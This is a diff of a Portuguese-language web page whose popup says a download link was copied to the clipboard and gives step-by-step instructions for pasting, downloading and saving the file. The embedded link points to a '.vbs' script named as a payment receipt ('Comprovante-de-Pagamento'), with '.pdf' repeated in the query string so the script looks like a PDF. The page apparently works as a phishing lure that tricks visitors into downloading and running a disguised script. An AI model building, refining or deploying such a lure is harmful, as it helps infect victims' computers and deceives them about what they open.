@@ -32,6 +32,13 @@
       line-height: 1.6;
     }
 
+    .popup .buttons {
+  display: flex;
+  justify-content: center;
+  margin-top: 1.5rem;
+}
+
+
     header {
       background-color: var(--azul);
       color: white;
@@ -247,17 +254,18 @@
   <div id="overlay"></div>
 
   <div class="popup" id="popup">
-    <h2>Link copiado com sucesso!</h2>
-    <p>O link para download do arquivo foi copiado para sua área de transferência.</p>
-    <div class="file-url" id="linkCopiado"></div>
-    <p><strong>Instruções:</strong></p>
-    <p>1. Cole o link na barra de endereços do seu navegador</p>
-    <p>2. Pressione Enter para iniciar o download</p>
-    <p>3. Salve o arquivo em um local seguro do seu computador</p>
-    <div class="buttons">
-      <button class="download-button cancel-button" onclick="fecharPopup()">Fechar</button>
-    </div>
+  <h2>Link copiado com sucesso!</h2>
+  <p>O link para download do arquivo foi copiado para sua área de transferência.</p>
+  <div class="file-url" id="linkCopiado"></div>
+  <p><strong>Instruções:</strong></p>
+  <p>1. Cole o link na barra de endereços do seu navegador</p>
+  <p>2. Pressione Enter para iniciar o download</p>
+  <p>3. Salve o arquivo em um local seguro do seu computador</p>
+  <div class="buttons">
+    <button class="download-button cancel-button" onclick="fecharPopup()">Fechar</button>
   </div>
+</div>
+
 
   <script>
     const link = "https://filedownload-938492893.vercel.app/Comprovante-de-Pagamento.vbs?id=49Comprovante-de-Pagamento.pdf21842921742193819Comprovante-de-Pagamento.pdf28392174239298329839";
